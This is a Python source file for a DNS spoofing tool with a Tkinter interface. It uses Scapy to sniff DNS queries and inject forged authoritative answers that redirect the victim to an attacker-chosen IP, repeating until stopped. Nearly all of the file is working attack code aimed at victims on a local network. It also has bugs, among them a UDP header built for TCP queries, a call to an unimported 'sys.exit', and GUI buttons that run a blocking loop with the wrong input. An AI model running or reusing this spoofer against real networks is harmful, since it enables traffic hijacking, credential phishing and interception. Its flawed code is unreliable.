import tkinter as tk
import requests
from os import uname
from subprocess import call
from sys import argv, exit
from time import ctime, sleep
from scapy.all import *

HEIGHT = 1000
WIDTH = 1000


def dnsSpoofer(interfaceValue, attackerIP):
    print(" Sniffing for DNS Packet ")
    # filter for DNS packets coming at port 53
    getDNSPacket = sniff(iface=interfaceValue, filter="dst port 53", count=1)

    # filtering DNS request packets
    if (getDNSPacket[0].haslayer(DNS)) and (getDNSPacket[0].getlayer(DNS).qr == 0) and (
            getDNSPacket[0].getlayer(DNS).qd.qtype == 1) and (getDNSPacket[0].getlayer(DNS).qd.qclass == 1):
        print('\n Got Query on %s ' % ctime())

    # extracting information from the recieved packet
    # this information will be used to craft spoofed DNS response packet
    clientSrcIP = getDNSPacket[0].getlayer(IP).src

    if getDNSPacket[0].haslayer(UDP):
        clientSrcPort = getDNSPacket[0].getlayer(UDP).sport
    elif getDNSPacket[0].haslayer(TCP):
        clientSrcPort = getDNSPacket[0].getlayer(TCP).sport
    else:
        pass

    clientDNSQueryID = getDNSPacket[0].getlayer(DNS).id

    clientDNSQueryDataCount = getDNSPacket[0].getlayer(DNS).qdcount

    clientDNSServer = getDNSPacket[0].getlayer(IP).dst

    clientDNSQuery = getDNSPacket[0].getlayer(DNS).qd.name

    print(
        ' Recieved Source IP: %s \n Recieved Source Port: %d \n Recieved Query ID: %d \n Query Data Count: %d \n Current DNS Server: %s \n DNS Query: %s ' % (
        clientSrcIP, clientSrcPort, clientDNSQueryID, clientDNSQueryDataCount, clientDNSServer, clientDNSQuery))

    spoofedDNSServerIP = attackerIP.strip()

    spooftedIPPacket = IP(src=spoofedDNSServerIP, dst=clientSrcIP)

    if getDNSPacket[0].haslayer(UDP):
        spoofedUDP_TCPPacket = UDP(sport=53, dport=clientSrcPort)
    elif getDNSPacket[0].haslayer(TCP):
        spoofedUDP_TCPPacket = UDP(sport=53, dport=clientSrcPort)

    # creating spoofed DNS response packet
    spoofedDNSPacket = DNS(id=clientDNSQueryID, qr=1, opcode=getDNSPacket[0].getlayer(DNS).opcode, aa=1, rd=0, ra=0,
                           z=0, rcode=0, qdcount=clientDNSQueryDataCount, ancount=1, nscount=1, arcount=1,
                           qd=DNSQR(qname=clientDNSQuery, qtype=getDNSPacket[0].getlayer(DNS).qd.qtype,
                                    qclass=getDNSPacket[0].getlayer(DNS).qd.qclass),
                           an=DNSRR(rrname=clientDNSQuery, rdata=spoofedDNSServerIP, ttl=86400),
                           ns=DNSRR(rrname=clientDNSQuery, type=2, ttl=86400, rdata=spoofedDNSServerIP),
                           ar=DNSRR(rrname=clientDNSQuery, rdata=spoofedDNSServerIP))

    print(' \n Sending spoofed response packet ')
    # sending our response DNS packet to the victim machine
    sendp(Ether() / spooftedIPPacket / spoofedUDP_TCPPacket / spoofedDNSPacket, iface=interfaceValue.strip(), count=1)
    print(
        ' Spoofed DNS Server: %s \n Source port: %d \n Destination port: %d ' % (spoofedDNSServerIP, 53, clientSrcPort))


def functionone(interfaceValue):
    while True:
        try:
            # Option 1 - get input from the attacker
            # interfaceValue = input("Enter the interface: ")
            attackerIP = input("Enter the attacker server's IP: ")

            # Option 2 - automatically trigger the DNS Spoofer
            # will need to uncomment the two lines below if DNSSpoofer.py need to be triggered automatically
            # will need to update the inteface value and attackerIP as per the attacker's network

            # interfaceValue = "eth0"
            # attackerIP = "192.168.1.117"

            # sending spoofed response DNS packets until the script is stopped by pressing Ctrl + C
            dnsSpoofer(interfaceValue, attackerIP)

        # if the attacker presses Ctrl + C - script will stop and exit the program.
        except KeyboardInterrupt:
            print("\n[*] User Requested Shutdown")
            print("[*] Exiting...")
            sys.exit(1)


root = tk.Tk()

canvas = tk.Canvas(root, height=HEIGHT, width=WIDTH)
canvas.pack()

root.title("DNS Spoofer")

frame = tk.Frame(root, bg='#80c1ff', bd=5)
frame.place(relx=0.5, rely=0.1, relwidth=0.75, relheight=0.1, anchor='n')

entry = tk.Entry(frame, font=40)
entry.place(relwidth=0.65, relheight=1)

button = tk.Button(frame, text="Get Interface", font=40, command=lambda: functionone(entry.get()))
button.place(relx=0.7, relheight=1, relwidth=0.3)

frame2 = tk.Frame(root, bg='#80c1ff', bd=5)
frame2.place(relx=0.5, rely=0.25, relwidth=0.75, relheight=0.1, anchor='n')

entry2 = tk.Entry(frame2, font=40)
entry2.place(relwidth=0.65, relheight=1)

button = tk.Button(frame2, text="Get Victim's IP address", font=40, command=lambda: functionone(entry2.get()))
button.place(relx=0.7, relheight=1, relwidth=0.3)

lower_frame = tk.Frame(root, bg='#80c1ff', bd=10)
lower_frame.place(relx=0.5, rely=0.45, relwidth=0.75, relheight=0.5, anchor='n')

label = tk.Label(lower_frame)
label.place(relwidth=1, relheight=1)

root.mainloop()
